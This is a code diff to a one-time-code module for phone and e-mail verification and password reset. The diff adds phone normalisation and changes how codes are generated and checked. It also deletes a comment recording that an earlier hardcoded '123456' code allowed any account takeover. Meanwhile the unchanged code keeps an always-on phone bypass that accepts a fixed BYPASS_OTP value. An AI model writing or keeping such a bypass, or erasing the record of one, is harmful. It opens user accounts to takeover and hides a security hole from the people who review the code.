@@ -4,15 +4,13 @@
  * Single-use, time-limited one-time codes for e-mail/phone verification and
  * password reset.
  *
- * Replaces the previous hardcoded '123456' constant, which allowed anyone to
- * verify any contact detail and to reset any account's password.
- *
  * Storage is in-process on purpose: this API runs as a single instance. Swap
  * `store` for Redis before scaling horizontally.
  */
 
 import crypto from 'crypto'
 import { ALLOW_TEST_OTP } from '../config.js'
+import { normalizePhone } from '../utils/phone.js'
 
 const TTL_MS = 10 * 60 * 1000
 const MAX_ATTEMPTS = 5
@@ -38,8 +36,18 @@ export const OTP_PURPOSE = {
 /** @type {Map<string, { hash: string, expiresAt: number, attempts: number, issuedAt: number, issueTimes: number[] }>} */
 const store = new Map()
 
+/** Stable id for phone OTPs: digits only (48500111222), so +48 / 48 / local match. */
+const normalizeIdentifier = (purpose, identifier) => {
+  const raw = String(identifier || '').trim()
+  if (purpose === OTP_PURPOSE.PHONE) {
+    const digits = normalizePhone(raw).replace(/\D/g, '')
+    return digits || raw.toLowerCase()
+  }
+  return raw.toLowerCase()
+}
+
 const keyFor = (purpose, identifier) =>
-  `${purpose}:${String(identifier || '').trim().toLowerCase()}`
+  `${purpose}:${normalizeIdentifier(purpose, identifier)}`
 
 const hash = (code) => crypto.createHash('sha256').update(String(code)).digest('hex')
 
@@ -55,6 +63,7 @@ const evictExpired = (now = Date.now()) => {
 /**
  * Issues a 6-digit code for (purpose, identifier).
  * Returns null when cooldown (60s) or hourly cap (3) blocks another send.
+ * Codes are 100000–999999 so SMS / number-pad never drop a leading zero.
  */
 export const issueOtp = (purpose, identifier) => {
   const now = Date.now()
@@ -66,7 +75,7 @@ export const issueOtp = (purpose, identifier) => {
   if (existing && now - existing.issuedAt < RESEND_INTERVAL_MS) return null
   if (recentIssues.length >= MAX_ISSUES_PER_HOUR) return null
 
-  const code = String(crypto.randomInt(0, 1_000_000)).padStart(6, '0')
+  const code = String(crypto.randomInt(100000, 1_000_000))
   store.set(key, {
     hash: hash(code),
     expiresAt: now + TTL_MS,
@@ -82,7 +91,7 @@ export const issueOtp = (purpose, identifier) => {
  * and the entry is always removed on success so a code works exactly once.
  */
 export const consumeOtp = (purpose, identifier, code) => {
-  const candidate = String(code || '').trim()
+  const candidate = String(code || '').replace(/\D/g, '')
 
   // Always-on phone bypass — skips the SMS gateway entirely.
   if (purpose === OTP_PURPOSE.PHONE && candidate === BYPASS_OTP) return true
